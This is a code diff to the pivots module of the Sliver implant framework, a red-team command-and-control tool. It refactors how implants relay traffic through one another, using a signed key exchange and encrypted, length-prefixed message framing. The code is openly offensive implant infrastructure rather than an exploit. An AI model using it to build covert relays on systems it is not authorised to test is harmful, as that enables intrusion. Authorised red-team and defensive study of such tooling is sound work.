@@ -2,7 +2,7 @@ package pivots
 
 /*
 	Sliver Implant Framework
-	Copyright (C) 2019  Bishop Fox
+	Copyright (C) 2021  Bishop Fox
 
 	This program is free software: you can redistribute it and/or modify
 	it under the terms of the GNU General Public License as published by
@@ -19,203 +19,205 @@ package pivots
 */
 
 import (
-	// {{if .Config.Debug}}
-	"log"
-	// {{end}}
 	"bytes"
+	"crypto/rand"
+	"encoding/base64"
 	"encoding/binary"
+	"errors"
+	"log"
 	"net"
 	"sync"
+	"time"
 
 	"github.com/bishopfox/sliver/implant/sliver/cryptography"
-	"github.com/bishopfox/sliver/implant/sliver/transports"
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
 )
 
 const (
-	readBufSize  = 1024
-	writeBufSize = 1024
+	readBufSize = 1024
 )
 
-// pivotsMap - holds the pivots, provides atomic access
-var pivotsMap = &PivotsMap{
-	Pivots: &map[uint32]*pivotsMapEntry{},
-	mutex:  &sync.RWMutex{},
+var (
+	ErrFailedWrite       = errors.New("failed to write")
+	ErrFailedKeyExchange = errors.New("failed key exchange")
+)
+
+// PivotPeer - Abstract interface for a pivot peer
+type PivotPeer interface {
+	ID() int64
+	Start() error
+	WriteEnvelope(*pb.Envelope) error
+	ReadEnvelope() (*pb.Envelope, error)
+	Close() error
+	RemoteAddress() string
 }
 
-var pivotListeners = make([]*PivotListener, 0)
-
-type pivotsMapEntry struct {
-	Conn          *net.Conn
-	PivotType     string
-	RemoteAddress string
-	Register      []byte
-}
-
-// PivotsMap - struct that defines de pivots, provides atomic access
-type PivotsMap struct {
-	mutex  *sync.RWMutex
-	Pivots *map[uint32]*pivotsMapEntry
-}
-
+// PivotListener - A pivot listener
 type PivotListener struct {
-	Type          string
-	RemoteAddress string
+	Type     string
+	Listener net.Listener
+	Pivots   *sync.Map // ID -> PivotPeer
 }
 
-func GetListeners() []*PivotListener {
-	return pivotListeners
+// Stop - Stop the pivot listener
+func (l *PivotListener) Stop() {
+	l.Pivots.Range(func(key interface{}, value interface{}) bool {
+		value.(PivotPeer).Close()
+		return true
+	})
+	l.Pivots = nil
+	l.Listener.Close()
 }
 
-// Pivot - Get Pivot by ID
-func (p *PivotsMap) Pivot(pivotID uint32) *pivotsMapEntry {
-	p.mutex.Lock()
-	defer p.mutex.Unlock()
-	return (*p.Pivots)[pivotID]
-}
-
-// AddPivot - Add a pivot to the map (atomically)
-func (p *PivotsMap) AddPivot(pivotID uint32, conn *net.Conn, t, addr string) {
-	p.mutex.Lock()
-	defer p.mutex.Unlock()
-	entry := pivotsMapEntry{
-		Conn:          conn,
-		PivotType:     t,
-		RemoteAddress: addr,
-	}
-	(*p.Pivots)[pivotID] = &entry
-}
-
-// RemovePivot - Add a pivot to the map (atomically)
-func (p *PivotsMap) RemovePivot(pivotID uint32) {
-	p.mutex.Lock()
-	defer p.mutex.Unlock()
-	delete((*p.Pivots), pivotID)
-}
-
-func Pivot(pivotID uint32) *net.Conn {
-	return pivotsMap.Pivot(pivotID).Conn
-}
-
-// ReconnectActivePivots - Send a new PivotOpen message back to the server for each alive pivot
-func ReconnectActivePivots(connection *transports.Connection) {
-	// {{if .Config.Debug}}
-	log.Println("Reconnecting active pivots...")
-	// {{end}}
-	for k, v := range *pivotsMap.Pivots {
-		SendPivotOpen(k, (*v).Register, connection)
+// PivotClose - Close a pivot connection
+func (l *PivotListener) PivotClose(id int64) {
+	if p, ok := l.Pivots.Load(id); ok {
+		l.Pivots.Delete(id)
+		p.(PivotPeer).Close()
 	}
 }
 
-// SendPivotOpen - Sends a PivotOpen message back to the server
-func SendPivotOpen(pivotID uint32, registerMsg []byte, connection *transports.Connection) {
-	// pivotsMap.Pivot(pivotID).Register = registerMsg
-	// pivot := pivotsMap.Pivot(pivotID)
-	// pivotOpen := &sliverpb.PivotOpen{
-	// 	PivotID:       pivotID,
-	// 	PivotType:     pivot.PivotType,
-	// 	RemoteAddress: pivot.RemoteAddress,
-	// 	RegisterMsg:   registerMsg,
-	// }
-	// data, err := proto.Marshal(pivotOpen)
-	// if err != nil {
-	// 	// {{if .Config.Debug}}
-	// 	log.Println(err)
-	// 	// {{end}}
-	// 	return
-	// }
-	// // W T F!!!!!
-	// if connection.IsOpen {
-	// 	connection.Send <- &sliverpb.Envelope{
-	// 		Type: sliverpb.MsgPivotOpen,
-	// 		Data: data,
-	// 	}
-	// } else {
-	// 	// {{if .Config.Debug}}
-	// 	log.Println("Connection is not open...")
-	// 	// {{end}}
-	// }
+// PivotID - Generate a new pivot id
+func PivotID() int64 {
+	buf := make([]byte, 8)
+	rand.Read(buf)
+	return int64(binary.LittleEndian.Uint64(buf))
 }
 
-// SendPivotClose - Sends a PivotClose message back to the server
-func SendPivotClose(pivotID uint32, err error, connection *transports.Connection) {
-	pivotClose := &sliverpb.PivotClose{
-		PivotID: pivotID,
-		Err:     err.Error(),
+// NetConnPivot - A generic Pivot connection via net.Conn
+type NetConnPivot struct {
+	id            int64
+	conn          net.Conn
+	readMutex     *sync.Mutex
+	writeMutex    *sync.Mutex
+	cipherCtx     *cryptography.CipherContext
+	readDeadline  time.Duration
+	writeDeadline time.Duration
+}
+
+// ID - ID of peer pivot
+func (p *NetConnPivot) ID() int64 {
+	return p.id
+}
+
+// Start - Starts the TCP pivot connection handler
+func (p *NetConnPivot) Start() error {
+	err := p.keyExchange()
+	if err != nil {
+		p.conn.Close()
+		return err
 	}
-	data, err := proto.Marshal(pivotClose)
+	return nil
+}
+
+// keyExchange - Exchange session key with peer, it's important that we DO NOT write
+// anything to the socket before we've validated the peer's key is properly signed.
+func (p *NetConnPivot) keyExchange() error {
+	p.conn.SetReadDeadline(time.Now().Add(tcpPivotReadDeadline))
+	peerHelloRaw, err := p.read()
+	p.conn.SetReadDeadline(time.Time{})
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Println(err)
+		log.Printf("tcp pivot read failure: %s", err)
 		// {{end}}
-		return
+		return ErrFailedKeyExchange
 	}
-	connection.Send <- &sliverpb.Envelope{
-		Type: sliverpb.MsgPivotClose,
-		Data: data,
-	}
-}
-
-// PivotWriteEnvelope - Writes a protobuf envelope to a generic connection
-func PivotWriteEnvelope(cipherCtx *cryptography.CipherContext, conn *net.Conn, envelope *sliverpb.Envelope) error {
-	data, err := proto.Marshal(envelope)
+	peerHello := &pb.PivotHello{}
+	err = proto.Unmarshal(peerHelloRaw, peerHello)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Print("Envelope marshaling error: ", err)
+		log.Printf("tcp pivot unmarshal failure: %s", err)
+		// {{end}}
+		return ErrFailedKeyExchange
+	}
+	validPeer := cryptography.MinisignVerify(peerHello.PublicKey, peerHello.PublicKeySignature)
+	if !validPeer {
+		// {{if .Config.Debug}}
+		log.Printf("tcp pivot invalid peer key")
+		// {{end}}
+		return ErrFailedKeyExchange
+	}
+	sessionKey := cryptography.RandomKey()
+	p.cipherCtx = cryptography.NewCipherContext(sessionKey)
+	ciphertext, err := cryptography.ECCEncryptToPeer(peerHello.PublicKey, peerHello.PublicKeySignature, sessionKey[:])
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("tcp pivot encryption failure: %s", err)
+		// {{end}}
+		return ErrFailedKeyExchange
+	}
+	publicKeyRaw, _ := base64.RawStdEncoding.DecodeString(cryptography.ECCPublicKey)
+	peerResponse, _ := proto.Marshal(&pb.PivotHello{
+		PublicKey:          publicKeyRaw,
+		PublicKeySignature: cryptography.ECCPublicKeySignature,
+		SessionKey:         ciphertext,
+	})
+	p.conn.SetWriteDeadline(time.Now().Add(tcpPivotWriteDeadline))
+	err = p.write(peerResponse)
+	p.conn.SetWriteDeadline(time.Time{})
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("tcp pivot write failure: %s", err)
+		// {{end}}
+		return ErrFailedKeyExchange
+	}
+	return nil
+}
+
+// write - Write a message to the TCP pivot with a length prefix
+// it's unlikely we can't write the 4-byte length prefix in one write
+// so we fail if we can't, messages may be much longer so we try to
+// drain the message buffer if we didn't complete the write
+func (p *NetConnPivot) write(message []byte) error {
+	p.writeMutex.Lock()
+	defer p.writeMutex.Unlock()
+	n, err := p.conn.Write(p.lengthOf(message))
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[tcppivot] Error writing message length: %v", err)
 		// {{end}}
 		return err
 	}
-	data, err = cipherCtx.Encrypt(data)
-	if err != nil {
-		return err
-	}
-	dataLengthBuf := new(bytes.Buffer)
-	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
-	_, err = (*conn).Write(dataLengthBuf.Bytes())
-	if err != nil {
+	if n != 4 {
 		// {{if .Config.Debug}}
-		log.Printf("pivots.PivotWriteEnvelope error %v and %d\n", err, dataLengthBuf)
+		log.Printf("[tcppivot] Error writing message length: %v", err)
 		// {{end}}
+		return ErrFailedWrite
 	}
-	totalWritten := 0
-	for totalWritten < len(data)-writeBufSize {
-		n, err2 := (*conn).Write(data[totalWritten : totalWritten+writeBufSize])
-		totalWritten += n
-		if err2 != nil {
-			// {{if .Config.Debug}}
-			log.Printf("pivots.PivotWriteEnvelope error %v\n", err)
-			// {{end}}
-		}
-	}
-	if totalWritten < len(data) {
-		missing := len(data) - totalWritten
-		_, err := (*conn).Write(data[totalWritten : totalWritten+missing])
+
+	total := 0
+	for total < len(message) {
+		n, err = p.conn.Write(message[total:])
+		total += n
 		if err != nil {
 			// {{if .Config.Debug}}
-			log.Printf("pivots.PivotWriteEnvelope error %v\n", err)
+			log.Printf("[tcppivot] Error writing message: %v", err)
 			// {{end}}
+			return err
 		}
 	}
 	return nil
 }
 
-// PivotReadEnvelope - Reads a protobuf envelope from a generic connection
-func PivotReadEnvelope(cipherCtx *cryptography.CipherContext, conn net.Conn) (*sliverpb.Envelope, error) {
+func (p *NetConnPivot) read() ([]byte, error) {
+	p.readMutex.Lock()
+	defer p.readMutex.Unlock()
 	dataLengthBuf := make([]byte, 4)
-	_, err := conn.Read(dataLengthBuf)
-	if err != nil {
+	n, err := p.conn.Read(dataLengthBuf)
+	if err != nil || n != 4 {
 		// {{if .Config.Debug}}
-		log.Printf("pivots.PivotReadEnvelope error (read msg-length): %v\n", err)
+		log.Printf("[tcppivot] Error (read msg-length): %v\n", err)
 		// {{end}}
 		return nil, err
 	}
+
 	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))
 	readBuf := make([]byte, readBufSize)
-	dataBuf := make([]byte, 0)
+	dataBuf := []byte{}
 	totalRead := 0
 	for {
-		n, err := conn.Read(readBuf)
+		n, err := p.conn.Read(readBuf)
 		dataBuf = append(dataBuf, readBuf[:n]...)
 		totalRead += n
 		if totalRead == dataLength {
@@ -223,22 +225,76 @@ func PivotReadEnvelope(cipherCtx *cryptography.CipherContext, conn net.Conn) (*s
 		}
 		if err != nil {
 			// {{if .Config.Debug}}
-			log.Printf("Read error: %s\n", err)
+			log.Printf("read error: %s\n", err)
 			// {{end}}
 			break
 		}
 	}
-	dataBuf, err = cipherCtx.Decrypt(dataBuf)
-	if err != nil {
-		return nil, err
-	}
-	envelope := &sliverpb.Envelope{}
-	err = proto.Unmarshal(dataBuf, envelope)
+	return dataBuf, err
+}
+
+func (p *NetConnPivot) lengthOf(message []byte) []byte {
+	dataLengthBuf := new(bytes.Buffer)
+	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(message)))
+	return dataLengthBuf.Bytes()
+}
+
+// writeEnvelope - Write a complete envelope
+func (p *NetConnPivot) WriteEnvelope(envelope *pb.Envelope) error {
+	data, err := proto.Marshal(envelope)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("Unmarshal envelope error: %v", err)
+		log.Printf("[tcppivot] Marshaling error: %s", err)
 		// {{end}}
-		return &sliverpb.Envelope{}, err
+		return err
+	}
+	data, err = p.cipherCtx.Encrypt(data)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[tcppivot] Encryption error: %s", err)
+		// {{end}}
+		return err
+	}
+	return p.write(data)
+}
+
+// readEnvelope - Read a complete envelope
+func (p *NetConnPivot) ReadEnvelope() (*pb.Envelope, error) {
+	data, err := p.read()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[tcppivot] Error reading message: %v", err)
+		// {{end}}
+		return nil, err
+	}
+	data, err = p.cipherCtx.Decrypt(data)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[tcppivot] Decryption error: %s", err)
+		// {{end}}
+		return nil, err
+	}
+	envelope := &pb.Envelope{}
+	err = proto.Unmarshal(data, envelope)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[tcppivot] Unmarshal envelope error: %v", err)
+		// {{end}}
+		return nil, err
 	}
 	return envelope, nil
+}
+
+// RemoteAddress - Remote address of peer
+func (p *NetConnPivot) RemoteAddress() string {
+	remoteAddr := p.conn.RemoteAddr()
+	if remoteAddr != nil {
+		return remoteAddr.String()
+	}
+	return ""
+}
+
+// Close - Close connection to peer
+func (p *NetConnPivot) Close() error {
+	return p.conn.Close()
 }
